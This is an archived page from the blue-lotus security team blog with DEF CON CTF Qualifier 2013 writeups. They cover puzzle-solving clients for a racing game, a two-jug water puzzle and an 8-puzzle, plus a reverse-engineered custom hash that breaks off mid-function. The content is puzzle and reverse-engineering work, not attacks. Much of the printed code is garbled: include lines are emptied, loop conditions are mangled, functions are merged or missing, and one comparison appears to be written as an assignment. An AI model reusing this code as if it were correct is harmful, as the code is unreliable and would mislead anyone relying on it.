
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>blue-lotus</title>
  <meta name="author" content="blue-lotus">

  
  <meta name="description" content="DEF CON CTF Qualifier 2013 OMGACM 3 Writeup Problem Description The remote host offers a racing game: % nc grandprix.shallweplayaga.me 2038
Use 'l' &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.blue-lotus.net/www/blog/page/2">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">blue-lotus</a></h1>
  
    <h2>Security Research Team @ Tsinghua University</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/def-con-ctf-qualifier-2013-omgacm-3-writeup/">DEF CON CTF Qualifier 2013 OMGACM 3 Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-17T00:00:00+08:00" pubdate data-updated="true">Jun 17<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>DEF CON CTF Qualifier 2013 OMGACM 3 Writeup</p>

<h2>Problem Description</h2>

<p>The remote host offers a racing game:</p>

<pre><code>% nc grandprix.shallweplayaga.me 2038
Use 'l' and 'r' to move. Don't crash.
Press return to start
</code></pre>

<p>We send a line feed to start the game and receive a 5&#215;9 board:</p>

<pre><code>|-----|
|     |
|     |
|     |
|     |
|     |
|     |
|     |
|     |
|  u  |
|-----|
</code></pre>

<p>We can send &#8220;l\n&#8221; to move left, &#8220;r\n&#8221; to move right, or &#8220;\n&#8221; to stand.<br/>
At the end of the round, all obstacles fall. It is obvious that we need to avoide those obstacles.</p>

<h2>Solution</h2>

<p>One way to view the problem is that we are forced to move forward one step each round.<br/>
We can choose one of the three grids in front us. This is a special case of the dynamic pathfinding problem.</p>

<p>We can apply a breadth-first search to find a safe path from <code>u</code> to some cell in the first row.<br/>
During the main loop of the search, we record for each cell how to reach it from the orignal grid.<br/>
As decisions are made once per round, we can record only the first step for each path.</p>

<p>Moreover, we find that there will be a finishing line made up by a row of <code>=</code> not far beyond the 1000th round.<br/>
It seems that <code>=</code> does not represent an obstacle.</p>

<pre><code>Round 1062 s
|-----|
|     |
|     |
|     |
|     |
|     |
|     |
|     |
|=====|
|u    |
|-----|

Round 1063 s
|-----|
|     |
|     |
|     |
|     |
|     |
|     |
|     |
|     |
|u====|
|-----|

Round 1064 s
You won this game. Push a key to play again

Round 1065 r
User won game
The key is: all our prix belong to you

Round 1066 r
</code></pre>

<p>So our criterion to check whether a grid represents an obstacle is: <code>c != ' ' &amp;amp;&amp;amp; c != 'u' &amp;amp;&amp;amp; c != '='</code>.</p>

<h2>Programs</h2>

<p>Here is the program with BFS:</p>

<pre><code>#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
using namespace std;

#define FOR(i, a, b) for (int i = (a); i &amp;lt; (b); i++)
#define REP(i, n) FOR(i, 0, n)
#define SET(i, v) memset(i, v, sizeof i)

const int N = 11, M = 7;
char a[N][M+1], first[N][M], buf[4096];

bool isObstacle(char c)
{
  return c != &amp;#039; &amp;#039; &amp;amp;&amp;amp; c != &amp;#039;u&amp;#039; &amp;amp;&amp;amp; c != &amp;#039;=&amp;#039;;
}

bool cmp(int y, int yy)
{
  return abs(y-M/2) &amp;lt; abs(yy-M/2);
}

char work()
{
  int t = 0, x, y;
  REP(i, N) {
    REP(j, M + 1) {
      a[i][j] = buf[t++];
      if (a[i][j] == &amp;#039;u&amp;#039;)
        y = j;
    }
    a[i][M] = 0;
  }

  const char op[] = &amp;quot;lsr&amp;quot;;
  SET(first, 0);
  queue&amp;lt;pair &amp;gt; q;
  q.push(make_pair(9, y));
  while (! q.empty()) {
    x = q.front().first;
    y = q.front().second;
    q.pop();
    if (x == 1) break;
    int ys[] = {y-1, y, y+1};
    sort(ys, ys + 3, cmp);
    REP(i, 3) {
      int yy = ys[i];
      if (! first[x-1][yy] &amp;amp;&amp;amp; ! isObstacle(a[x-1][yy])) {
        first[x-1][yy] = x == 9 ? op[yy-y+1] : first[x][y];
        q.push(make_pair(x-1, yy));
      }
    }
  }

  const int cols[M-2] = {3,2,4,1,5};
  REP(i, M-2)
    if (first[1][cols[i]])
      return first[1][cols[i]];
  return 's';
}

int main()
{
  int sock_fd;
  struct hostent *host;
  struct sockaddr_in serv_addr = {};
  if ((host = gethostbyname("grandprix.shallweplayaga.me")) == NULL)
    return 1;
  if ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    return 1;
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(2038);
  serv_addr.sin_addr = *((struct in_addr *)host-&amp;gt;h_addr);
  if (connect(sock_fd, (struct sockaddr *)&amp;amp;serv_addr, sizeof serv_addr) == -1)
    return 1;

  // Press return to start
  read(sock_fd, buf, sizeof buf);
  puts(buf);
  write(sock_fd, "\n", 1);

  int round = 0, len;
  char choice[2] = {0, '\n'};
  while (len = read(sock_fd, buf, sizeof buf - 1), buf[len] = '', len &amp;gt; 40) {
    puts(buf);
    choice[0] = work();
    printf("Round %d %c\n", ++round, choice[0]);
    write(sock_fd, choice, sizeof choice);
  }
}
</code></pre>

<p>During the contest, we use another approach to solve this task by using a heuristic to find the &#8220;safest&#8221; column: the one with the least obstacles in the inverted triangle behind it.<br/>
And then plan a path to move to the safest column while dodging obstacles nearby.</p>

<pre><code>#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#define MAXDATASIZE 4096
#include
#include
using namespace std;

const int N = 11;
const int M = 7;

char A[N][M+1];
char buf[MAXDATASIZE];

int x, y;

char path[N];

int c[M+1], s[M+1];

void cnt(int p, int y, int r)
{
    if (A[p][y] != ' ') return ;
    if (p == 1) {
        c[r]++;
        return ;
    }
    for (int j = -1; j  0 &amp;amp;&amp;amp; y + j &amp;lt; M-1) {
            cnt(p - 1, y + j, r);
        }
}

char op[4]=&amp;quot;lsr&amp;quot;;

bool dfs(int p, int y, int r)
{
    if ((A[p][y] != &amp;#039; &amp;#039;) &amp;amp;&amp;amp; (A[p][y] != &amp;#039;u&amp;#039;) &amp;amp;&amp;amp; (A[p][y] != &amp;#039;=&amp;#039;))
        return 0;
    if (p == 5) {
        return y == r;
    }
    for (int j = -1; j  0 &amp;amp;&amp;amp; y + j c[j];
}

void work()
{
    //puts(buf);
    memset(c, 0, sizeof c);
    int t = 0;
    for (int i = 0 ; i &amp;lt; N; i++) {
        for (int j = 0 ; j &amp;lt;= M; j++)
            A[i][j] = buf[t++];
        A[i][M] = 0;
        //puts(A[i]);
    }

    x = 9;
    for (int j = 1; j &amp;lt; 6; j++)
        if (A[9][j] == &amp;#039;u&amp;#039;) y = j;

    for (int i = 1; i &amp;lt; 6; i++) cnt(5, i, i);
    for (int i = 1; i &amp;lt; 6; i++)  s[i] = i;
    //sort(s + 1, s + 6, cmp);
    int k;
    for (int i = 1; i &amp;lt; 6; i++)
        for (int j = i+1; j  c[s[j]]) {
                k = s[i]; s[i] = s[j]; s[j] = k;
            }
    for (int i = 1; i h_addr);
    bzero(&amp;amp;(serv_addr.sin_zero),8);
    if (connect(sock_fd, (struct sockaddr *)&amp;amp;serv_addr,sizeof(struct sockaddr))==-1){
        perror("connect error");
        exit(1);
    }

    send(sock_fd,"\n",1,0);
    iLength=recv(sock_fd,buf,sizeof(buf),0);buf[iLength] = 0;
    puts(buf);
    iLength=recv(sock_fd,buf,sizeof(buf),0);buf[iLength] = 0;
    puts(buf);

    int cnt = 0;
    char r[3] = "";
    r[1]='\n';
    do {
        work();
        r[0] = path[9];
        printf("Round %d %s", ++cnt, r);
        send(sock_fd,r,2,0);
        iLength=recv(sock_fd,buf,sizeof(buf),0);
        buf[iLength]=0;
        puts(buf);
    } while (iLength &amp;gt; 40);
}
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/def-con-ctf-qualifier-2013-omgacm-2-writeup/">DEF CON CTF Qualifier 2013 OMGACM 2 Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-17T00:00:00+08:00" pubdate data-updated="true">Jun 17<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>DEF CON CTF Qualifier 2013 OMGACM 2 Writeup</p>

<p>Text adventures are one of the oldest types of computer games and form a subset of the adventure genre.<br/>
After walking around for a while, we find that we need to go all the way north and reach a room with two jugs.</p>

<p><code>look red jug</code>, <code>look blue jug</code> and <code>look inscription</code> gives the detail of a water-pouring problem with two jugs and<br/>
we are required to give a solution in limited time and trials. One insight is that once we decide to pour water from the red jug to the blue jug,<br/>
there will be no sense to pour water in the opposite direction (from the blue jug to the red jug) in later actions.<br/>
What we can do is emptying the blue jug, filling the red jug and pouring water from the red jug to the blue jug.<br/>
We can thus simulate the two cases (from red to blue and from blue to red) separately and take the case with the smaller actions.</p>

<p>NB. we need to send a bunch of actions at once to reduce time spent on network transmission.<br/>
It seems that we can only send two packets at a mission. Here is the program:</p>

<pre><code>require 'socket'
require 'set'

$sock = TCPSocket.new 'diehard.shallweplayaga.me', 4001

def send d
  $sock.puts d
  msg = $sock.recv(1024)
  print msg
  msg
end

def recv
  msg = $sock.recv 1024
  print msg
  msg
end

def pour blue, red, ins
  r = b = c = 0
  while b != ins &amp;amp;&amp;amp; r != ins
    c += 1
    if b == blue
      b = 0
    elsif r &amp;gt; 0
      bb = [r+b, blue].min
      r -= bb-b
      b = bb
    else
      r = red
    end
  end
  c
end

#res = send ''
#while res[/Exits: (.*)/]
  #exits = $1.split.select {|c| c != 's' }
  #res = send(exits.member?('n') ? 'n' : exits[0])
#end
send 'nnnnnnenwn'.chars.map {|c| "#{c}\n" }.join.chomp

loop do
  exchange = false

  res = send "get red jug\nget blue jug\nlook red jug\nlook blue jug\nlook inscription"
  res += recv until res[/A red jug holds 0 of (\d+) gallons/]
  red = $1.to_i
  res += recv until res[/A blue jug holds 0 of (\d+) gallons/]
  blue = $1.to_i
  res += recv until res[/To get to the next stage put (\d+) gallons/]
  ins = $1.to_i

  sred, sblue = 'red', 'blue'
  res1 = pour blue, red, ins
  res2 = pour red, blue, ins
  if res1 &amp;gt; res2
    exchange = true
    red, blue = blue, red
    sred, sblue = sblue, sred
  end

  r = b = 0
  msg = ''
  while b != ins &amp;amp;&amp;amp; r != ins
    if b == blue
      b = 0
      msg += "empty #{sblue} jug\n"
    elsif r &amp;gt; 0
      bb = [r+b, blue].min
      r -= bb-b
      b = bb
      msg += "pour #{sred} jug into #{sblue} jug\n"
    else
      r = red
      msg += "fill #{sred} jug\n"
    end
  end
  msg += "put #{b == ins ? sblue : sred} jug onto scale\n"
  msg += "drop #{b == ins ? sred : sblue} jug\n"
  msg += "n"

  res = send msg
  res += recv until res[/You (see|find)/]
  if res['You find yourself in a solid granite']
    send "look key\nget key"
    break
  end
end
</code></pre>

<p>Check out <a href="http://ascii.io/a/3641">http://ascii.io/a/3641</a> to understand the entire flow of the program.</p>

<p>And the very program we used in the contest:</p>

<pre><code>#!/usr/bin/env python

import os, sys, socket, random, subprocess
from subprocess import Popen, PIPE

import os, sys

def solve(a, b, c):
    x = y = 0
    n = 2
    flag = True
    while x == 0 and y == 0:
        for i in range(1, n):
            t = i * a - (n - i) * b
            if t == c:
                x = i
                y = n - i
                break
            elif t == -c:
                flag = False
                x = n - i
                y = i
                a, b = b, a
                break
        n += 1
    va = vb = 0
    ret = ''
    A = B = ''
    if flag:
        A = 'red jug'
        B = 'blue jug'
    else:
        A = 'blue jug'
        B = 'red jug'
    #print '%d x %d - %d x %d = %d, %d -&amp;gt; %s, %d -&amp;gt; %s' % (x, a, y, b, c, a, A, b, B)

    while x or y:
        if va == 0:
            ret += 'fill %s\n' % A
            x -= 1
            va = a
            #print va, vb
        elif vb == b:
            ret += 'empty %s\n' % B
            y -= 1
            vb = 0
            #print va, vb
        else:
            t = b - vb
            if t &amp;gt; va:
                t = va
            va -= t
            vb += t
            ret += 'pour %s into %s\n' % (A, B)
            #print va, vb

    if va != c and vb != c:
        vb += va
        #print va, vb
        ret += 'pour %s into %s\n' % (A, B) 

    if va == c:
        ret += 'put %s onto scale\n' % A
        ret += 'drop %s\nn' % B
    elif vb == c:
        ret += 'put %s onto scale\n' % B
        ret += 'drop %s\nn' % A
    else:
        print 'Error'

    return ret



s = socket.socket()
s.connect(('diehard.shallweplayaga.me', 4001))

r = ['n', 'n', 's', 's', 'n', 'n', 's', 's', 'w', 'e', 'w', 'w', 's', 'n', 'e', 'e', 'w', 'w', 's', 'n', 'n', 'w', 'e', 'n', 'e', 'w', 'e', 'e', 'w', 'n', 'n', 'e', 'w', 's', 's', 'e', 'e', 'n', 's', 'w', 'e', 'w', 'w', 's', 'n', 'n', 'n', 's', 's', 'e', 'w', 'e', 'e', 'n', 'n', 'n', 'n', 's', 's', 'n', 'n', 's', 'n', 'n', 'n', 'e', 'w', 'e', 'n', 's', 'w', 's', 's', 's', 'n', 's', 's', 'n', 's', 'n', 's', 's', 'n', 'n', 's', 's', 's', 'n', 'n', 'n', 'n', 's', 'n', 'n', 's', 's', 'n', 'n', 's', 's', 's', 's', 'n', 'n', 'n', 's', 's', 's', 's', 'n', 's', 'w', 'w', 'w', 's', 's', 'e', 'w', 'n', 'n', 'e', 'n', 'e', 'e', 'n', 's', 'w', 'e', 'w', 'w', 's', 'n', 'n', 's', 'w', 'e', 'n', 'n', 'e', 'w', 's', 'w', 'e', 'n', 'e', 'e', 'e', 'w', 'w', 'e', 'w', 'w', 's', 'e', 'w', 'e', 'w', 'e', 'w', 'e', 'w', 's', 'n', 'e', 'w', 'e', 'e', 'n', 's', 'w', 'w', 'w', 's', 's', 'e', 'w', 'n', 's', 'e', 'e', 'n', 's', 'w', 'w', 'n', 'n', 's', 'w', 'e', 'n', 's', 'w', 'e', 'w', 'e', 'n', 's', 's', 'e', 'w', 'n', 'w', 'e', 'n', 'e', 'n', 'e', 'w', 'e', 'e', 'n', 'n', 's', 's', 'w', 'e', 'w', 'e', 'w', 'e', 'w', 'e', 'n', 'n', 'n', 's', 's', 'n', 's', 's', 'w', 'w', 'w', 'e', 'w', 'e', 's', 'n', 'e', 'e', 'w', 'e', 'n', 'n', 'n', 'n', 'n', 's', 's', 'n', 's', 'n', 's', 'n', 's', 'n', 's', 'n', 's', 's', 's', 'n', 'n', 'n', 's', 's', 'n', 'n', 's', 's', 'n', 's', 'n', 'n', 's', 's', 's', 'n', 's', 'n', 'n', 's', 's', 's', 'n', 's', 'n', 's', 'n', 's', 'n', 's', 'w', 'w', 's', 'n', 'n', 'n', 's', 's', 's', 'n', 's', 'n', 's', 'n', 'n', 'w', 'e', 'w', 'e', 'w', 'e', 's', 'e', 'e', 'w', 'e', 'w', 'e', 'n', 's', 'w', 'w', 'n', 'w', 'e', 'n', 'e', 's', 'n', 'e', 'e', 'w', 'w', 'e', 'w', 'e', 'w', 'n', 'n', 's', 'n', 'e', 'w', 's', 'w', 'e', 's', 'w', 's', 'w', 'e', 's', 'w', 's', 'e', 'w', 'e', 'w', 'w', 'e', 'e', 'e', 'n', 'n', 'n', 'n', 'n', 'n', 'e', 'n', 'w', 'e', 's', 'w', 's', 'n', 'e', 'n', 'w', 'e', 's', 'w', 'e', 'w', 'e', 'n', 's', 'n', 'w', 'n']

r = 'nnnnnnenwn'

print s.recv(1000)

def send(content):
    if not content: 
        return
    print 'send ...' + content
    global s
    s.send(content + '\n')
    data = s.recv(4096)
    data = data.strip()
    if data:
        print data
    return data

def interactive():
    while True:
        cmd = raw_input('cmd: \n')
        if cmd == 'quit':
            return
        send(cmd)

for i in r:
    send(i)

send('get red jug')
send('get blue jug')
send('fill blue jug')
send('pour blue jug into red jug')
send('empty red jug')
send('pour blue jug into red jug')
send('fill blue jug')
send('pour blue jug into red jug')
send('put blue jug onto scale')
#send('drop blue jug')
send('drop red jug')
send('n')
send('look')

#send(raw_input('cmd?\n'))

fill_red = 'A red jug holds 0 of '
fill_blue = 'A blue jug holds 0 of '
target_str = 'To get to the next stage put '

while True:
    st = -1
    ed = -1
    d = send('look red jug\nlook blue jug\nlook inscription')
    while st == -1 or ed == -1:
        st = d.find(fill_red)
        ed = d.find(' ', st + len(fill_red))
        if st == -1 or ed == -1:
            dd = s.recv(4096)
            dd = dd.strip()
            if dd:
                print dd
            d += dd
            continue
        red = int(d[st + len(fill_red): ed])

    st = -1
    ed = -1
    while st == -1 or ed == -1:
        st = d.find(fill_blue)
        ed = d.find(' ', st + len(fill_blue))
        if st == -1 or ed == -1:
            dd = s.recv(4096)
            dd = dd.strip()
            if dd:
                print dd
            d += dd
            continue
        blue = int(d[st + len(fill_blue): ed])

    st = -1
    ed = -1
    while st == -1 or ed == -1:
        st = d.find(target_str)
        ed = d.find(' ', st + len(target_str))
        if st == -1 or ed == -1:
            dd = s.recv(4096)
            dd = dd.strip()
            if dd:
                print dd
            d += dd
            continue
        target = int(d[st + len(target_str):ed])

    print 'solving ... %d %d %d' % (red, blue, target)
    #p1 = Popen(["./solve.out"], stdin=PIPE, stdout=PIPE)
    #p1.stdin.write('%d %d %d' % (red, blue, target))
    #p1.stdin.close()
    #result = p1.stdout.read() 
    result = solve(red, blue, target)

    d = send('get red jug\nget blue jug\n' + result.strip())

    while d.find('The scale balances perfectly and a door opens to the next room!') == -1:
        dd = s.recv(4096)
        if dd:
            print dd.strip()
        d += dd
    if d.find('You find yourself in a solid granite chamber filled with hexadecimal') &amp;gt; -1:
        dd = send('look key\nget key')
        interactive()
    #interactive()
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/def-con-ctf-qualifier-2013-omgacm-1-writeup/">DEF CON CTF Qualifier 2013 OMGACM 1 Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-17T00:00:00+08:00" pubdate data-updated="true">Jun 17<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>We are given several 8-puzzles and are required to give a sequence of actions that leads</p>

<p>from the initial state to the goal state.</p>

<p>Each state of an 8-puzzle can be represented as a permutation of 9 such as 123456780,</p>

<p>which can be expressed as a Lehmor code in the factorial number system.</p>

<p>Given that there is a bijection from 0 ~ n!-1 to a number coded in the factorial number system,</p>

<p>we can encode the state of the 8-puzzle compactly.</p>

<p>Thus we translate the puzzle into a pathfinding problem (from the initial state to the goal state).</p>

<p>Many algorithms apply and we just take one of the simplest: breadth-first search.</p>

<p>On a separate note, we need to send the whole sequence of actions at once to reduce time spent on network transmission.</p>

<p>Here is the heart of the program (in C++ 11):</p>

<pre><code>#include 
#include 
#include 
#include 
using namespace std;

const int factorial[] = {1,1,2,6,24,120,720,5040,40320};

#define FOR(i, a, b) for (int i = (a); i &amp;lt; (b); i++)
#define REP(i, n) FOR(i, 0, n)

enum Direction {U, R, D, L};

struct Node
{
  int a[9], g;
  int zero() const {
    return int(find(a, a + 9, 0) - a);
  }
  Node up() {
    int p = zero();
    if (p = 6) throw 0;
    Node res = *this;
    swap(res.a[p], res.a[p+3]);
    res.g = g + 1;
    return res;
  }
  Node left() {
    int p = zero();
    if (p % 3 == 0) throw 0;
    Node res = *this;
    swap(res.a[p], res.a[p-1]);
    res.g = g + 1;
    return res;
  }
  bool operator==(const Node &amp;amp;rhs) const {
    return equal(a, a + 9, rhs.a);
  }
};

int closed[362880];

const Node dst = 1;
int lehmorCode(const Node &amp;amp;x)
{
  int h = 0;
  REP(i, 9)
    REP(j, i)
      if (x.a[j] &amp;gt; x.a[i])
        h += factorial[8-j];
  return h;
}

int bfs(const Node &amp;amp;src)
{
  queue q;
  fill_n(closed, 362880, -1);
  int dst_code = lehmorCode(dst);

  Node orig = dst;
  q.push(orig);
  closed[dst_code] = -2;

  while (! q.empty()) {
    Node curr = q.front();
    q.pop();
    if (curr == src) return curr.g;
    int dir = 0;
    function fs[] = {&amp;amp;Node::up, &amp;amp;Node::right, &amp;amp;Node::down, &amp;amp;Node::left};
    for (auto f : fs) {
      dir++;
      try {
        Node succ = f(curr);
        int h = lehmorCode(succ);
        if (closed[h] == -1) {
          q.push(succ);
          closed[h] = dir - 1;
        }
      } catch (int) {
      }
    }
  }
  return -1;
}

void print(Node x)
{
  for(;;) {
    switch (closed[lehmorCode(x)]) {
    case U:
      x = x.down();
      puts("up");
      break;
    case R:
      x = x.left();
      puts("right");
      break;
    case D:
      x = x.up();
      puts("down");
      break;
    case L:
      x = x.right();
      puts("left");
      break;
    case -2:
      return;
    }
  }
}

int main()
{
  Node src;
  REP(i, 9)
    scanf("%1d", &amp;amp;src.a[i]);
  int len = bfs(src);
  printf("%d\n", len);
  if (len &amp;gt; 0)
    print(src);
}
</code></pre>

<p>And the communication module written in Ruby:</p>

<pre><code>require 'socket'

s = TCPSocket.new 'pieceofeight.shallweplayaga.me', 8273

src = ''
rest = 0

while line = s.gets
  puts line
  if line =~ /|  \d/
    xs = line.scan(/\|  ./).map {|x| x[-1] }
    if xs.find {|x| x =~ /\d/ }
      src &amp;lt; 0
      rest -= 1
    else
      IO.popen './acm1', 'r+' do |h|
        h.puts src
        h.close_write
        xs = h.read.lines.to_a
        s.puts xs[1..-1].join
        rest = xs[0].to_i
      end
    end
    src = ''
  end
  if line =~ /The key is/
    File.open('flag') {|hh| hh.puts line }
  end
end
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/def-con-ctf-qualifier-2013-gnireenigne-5-writeup/">DEF CON CTF Qualifier 2013 Gnireenigne 5 Writeup</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-06-17T00:00:00+08:00" pubdate data-updated="true">Jun 17<span>th</span>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This is a x64 binary running on Linux. It binds to the first IP of eth0 and accepts connections at port 6823. The client should submit data in the following manner:</p>

<pre><code>4 bytes length | the first block | the second block
</code></pre>

<p>The two blocks have identical sizes, and the first field indicates the total size of two blocks. The total size should be between 48 and 1024.</p>

<p>After that, our input will be checked against two hashing algorithms. The first one is a standard MD5, and the MD5 values of two blocks cannot be identical, otherwise no key will be printed. The second one is an unknown hashing algorithm. When we found a collision in the second hashing algorithm, we could finally get the key.</p>

<p>We spent some time to fully reverse that algorithm:</p>

<pre><code>unsigned char BOX_[256] = { 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,
    0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
    0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,
    0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
    0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,
    0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
    0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,
    0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
    0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
    0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
    0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
    0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
    0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
    0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
    0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00,
    0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00,
    0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00,
    0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
    0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00,
    0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
    0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00,
    0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
    0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00,
    0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00,
    0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00};

void calc_hash(unsigned char* input, unsigned int size, unsigned char* output)
{
    unsigned int* BOX = (unsigned int*)BOX_;
    unsigned char *buffer_ptr = NULL;

    unsigned char IV[] = {0x68, 0x69, 0x20, 0x6D, 0x79, 0x20, 0x6E, 0x61, 0x6D, 0x65, 0x20, 0x69, 0x73, 0x20, 0x69, 0x74};

    unsigned int counter_1 = 0;
    unsigned int ctr = 0;

    ctr = size + 1;
    while((ctr &amp; 0x3f) != 0x38)
    {
        ++ctr;
    }
    buffer_ptr = (unsigned char*)malloc(ctr + 8);
    memcpy(buffer_ptr, input, size);
    *(buffer_ptr + size) = 0x80;
    unsigned int input_size_2 = size + 1;

    unsigned int buffer_A[2000] = {0};

    unsigned int string_1, string_2, string_3, string_4, string_5, ctr_3, string_6;

    while(ctr &gt; input_size_2)
    {
        *(buffer_ptr + input_size_2) = 0;
        ++input_size_2;
    }

    unsigned int a_ = size &lt;&lt; 3;
    unsigned char* b_ = buffer_ptr + ctr;
    *b_ = (unsigned char)a_;
    *(b_ + 1) = (unsigned char)(a_ &gt;&gt; 8);
    *(b_ + 2) = (unsigned char)(a_ &gt;&gt; 16);
    *(b_ + 3) = (unsigned char)(a_ &gt;&gt; 24);

    unsigned int c_ = size &gt;&gt; 0x1d;
    unsigned char* d_ = buffer_ptr + ctr + 4;
    *d_ = (unsigned char)c_;
    *(d_ + 1) = (unsigned char)(c_ &gt;&gt; 8);
    *(d_ + 2) = (unsigned char)(c_ &gt;&gt; 16);
    *(d_ + 3) = (unsigned char)(c_ &gt;&gt; 24);
    input_size_2 = 0;

    while(ctr &gt; input_size_2)
    {
        // 0x40248f
        unsigned int ctr_2 = 0;
        while(ctr_2 &lt;= 15)
        {
            // 0x402498
            unsigned char* e_ = buffer_ptr + input_size_2 + (ctr_2 &lt;&lt; 2);
            unsigned int c = *(e_);
            unsigned int d = *(e_ + 1);
            d = d &lt;&lt; 8;
            d = d | c;
            c = *(e_ + 2) &lt;&lt; 16;
            d = d | c;
            c = *(e_ + 3) &lt;&lt; 24;
            c = c | d;
            buffer_A[ctr_2] = c;
            ++ctr_2;
        }
        string_1 = *(unsigned int*)IV;
        string_2 = *(unsigned int*)(IV + 4);
        string_3 = *(unsigned int*)(IV + 8);
        string_4 = *(unsigned int*)(IV + 12);

        ctr_2 = 0;
        while(ctr_2 &lt;= 63)
        {
            // 0x402535
            if(ctr_2 &lt;= 0xf)
            {
                string_5 = (~string_2 &amp; string_4) | (string_3 &amp; string_2);
                ctr_3 = ctr_2;
            }
            // 0x402558
            else if(ctr_2 &lt;= 0x1f)
            {
                string_5 = (~string_4 &amp; string_3) | (string_4 &amp; string_2);
                ctr_3 = ((ctr_2 &lt;&lt; 2) + ctr_2 + 1) &amp; 0xf;
            }
            // 0x402588
            else if(ctr_2 &lt;= 0x2f)
            {
                string_5 = (string_3 ^ string_2) ^ string_4;
                ctr_3 = (ctr_2 * 3 + 5) &amp; 0xf;
            }
            else
            {
                // 0x4025b0
                string_5 = (~string_4 | string_2) ^ string_3;
